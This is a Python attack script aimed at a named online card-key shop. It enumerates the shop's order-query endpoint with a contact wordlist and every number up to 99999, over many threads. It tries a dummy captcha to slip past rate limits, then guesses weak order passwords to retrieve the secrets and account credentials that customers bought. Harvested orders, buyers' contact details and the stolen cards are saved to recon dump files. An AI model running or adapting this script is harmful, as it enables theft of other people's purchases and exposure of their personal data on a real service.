#!/usr/bin/env python3
"""lubanqq contact spray — modern ACG query {list,total}."""
import json
import os
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings()

OUT = Path(os.environ.get("OUT") or "/data/recon/lubanqq/dump")
OUT.mkdir(parents=True, exist_ok=True)
B = "https://lubanqq.top"
WORKERS = int(os.environ.get("WORKERS") or "16")
MAX_N = int(os.environ.get("MAX_N") or "99999")

lock = threading.Lock()
tls = threading.local()
stats = {"done": 0, "hits": 0, "orders": 0, "kami": 0, "acc": 0, "errors": 0}
seen_tn = set()
kami_rows = []
accounts = set()
hit_orders = []


def log(*a):
    print(*a, flush=True)


def S():
    s = getattr(tls, "s", None)
    if not s:
        s = requests.Session()
        s.verify = False
        s.headers.update(
            {
                "User-Agent": "Mozilla/5.0",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": B,
                "Referer": B + "/user/index/query",
            }
        )
        tls.s = s
    return s


def cards(secret):
    blob = str(secret or "").replace("<br/>", "\n").replace("<br>", "\n")
    return [x.strip() for x in re.split(r"[\r\n]+", blob) if x.strip()]


def save():
    (OUT / "contact_state.json").write_text(json.dumps(stats, ensure_ascii=False), encoding="utf-8")
    (OUT / "contact_kami.json").write_text(
        json.dumps(kami_rows, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    (OUT / "contact_hits.json").write_text(
        json.dumps(hit_orders, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    (OUT / "contact_accounts.txt").write_text(
        "\n".join(sorted(accounts)) + ("\n" if accounts else ""), encoding="utf-8"
    )


def extract(j):
    if not isinstance(j, dict) or j.get("code") != 200:
        return []
    data = j.get("data")
    if isinstance(data, list):
        return data
    if isinstance(data, dict):
        return data.get("list") or []
    return []


def fetch_secret(tn, kw):
    for pw in ["", "123456", "000000", str(kw)]:
        try:
            r = S().post(
                B + "/user/api/index/secret",
                data={"orderId": tn, "password": pw},
                timeout=10,
            )
            j = r.json()
        except Exception:
            continue
        if j.get("code") == 200 and j.get("data"):
            d = j["data"]
            return (d.get("secret") if isinstance(d, dict) else d), pw
        if "还未支付" in r.text or "未查询到" in r.text or "密码错误" in r.text:
            if "密码错误" in r.text:
                continue
            break
    return None, None


def work(kw):
    kw = str(kw)
    try:
        r = S().post(B + "/user/api/index/query", data={"keywords": kw}, timeout=10)
        j = r.json()
    except Exception:
        with lock:
            stats["errors"] += 1
            stats["done"] += 1
        return
    msg = str(j.get("msg") or "")
    if "频繁" in msg or "验证码" in msg:
        # try with dummy captcha
        try:
            r = S().post(
                B + "/user/api/index/query",
                data={"keywords": kw, "captcha": "0000"},
                timeout=10,
            )
            j = r.json()
            msg = str(j.get("msg") or "")
        except Exception:
            pass
        if "频繁" in msg:
            time.sleep(8)
            return work(kw)
        if "验证码" in msg:
            with lock:
                stats["done"] += 1
            return
    orders = [x for x in extract(j) if isinstance(x, dict)]
    with lock:
        stats["done"] += 1
        if stats["done"] % 1000 == 0:
            log("progress", stats, "kw", kw)
            save()
    if not orders:
        return
    log("HIT", kw, "n", len(orders), json.dumps(orders[0], ensure_ascii=False)[:180])
    with lock:
        stats["hits"] += 1
    for od in orders:
        tn = od.get("trade_no")
        with lock:
            if not tn or tn in seen_tn:
                continue
            seen_tn.add(tn)
            od = dict(od)
            od["_query_kw"] = kw
            hit_orders.append(od)
            stats["orders"] += 1
        if od.get("status") != 1:
            continue
        secret, pw = fetch_secret(tn, kw)
        if not secret:
            continue
        cs = cards(secret)
        row = {
            "trade_no": tn,
            "query_kw": kw,
            "password": pw,
            "amount": od.get("amount"),
            "contact": od.get("contact"),
            "pay_time": od.get("pay_time"),
            "commodity_id": od.get("commodity_id"),
            "secret": secret,
            "cards": cs,
            "card_count": len(cs),
        }
        with lock:
            kami_rows.append(row)
            stats["kami"] += 1
            for c in cs:
                accounts.add(c)
            stats["acc"] = len(accounts)
            save()
        log("KAMI", tn, "kw", kw, "cards", len(cs), "amount", od.get("amount"))


def wordlist():
    words = []
    for p in [
        Path("/data/recon/hao998/dump/extra_words.txt"),
        Path("/data/recon/hao998/dump/priority_contacts.txt"),
        Path("/data/recon/lubanqq/dump/extra_words.txt"),
    ]:
        if p.exists():
            for line in p.read_text(errors="ignore").splitlines():
                w = line.strip()
                if w and 2 <= len(w) <= 16 and w.replace("@", "").replace(".", "").isalnum():
                    words.append(w)
    proven = [
        "123", "123123", "12323", "1234", "12345", "123456", "10086", "10010",
        "5201314", "1314", "666666", "888888", "111111", "000000", "112233",
        "778899", "123654", "321321", "555888", "666555", "1519", "2219",
        "7124", "9090", "9417", "test", "admin", "luban", "lubanqq", "yansi",
        "qq123", "qq888",
    ]
    words = proven + words
    for i in range(1, MAX_N + 1):
        words.append(str(i))
    seen, out = set(), []
    for w in words:
        if w not in seen:
            seen.add(w)
            out.append(w)
    return out


def main():
    words = wordlist()
    log("words", len(words), "workers", WORKERS)
    t0 = time.time()
    with ThreadPoolExecutor(WORKERS) as ex:
        list(ex.map(work, words, chunksize=32))
    save()
    log("DONE", stats, "sec", int(time.time() - t0))


if __name__ == "__main__":
    main()
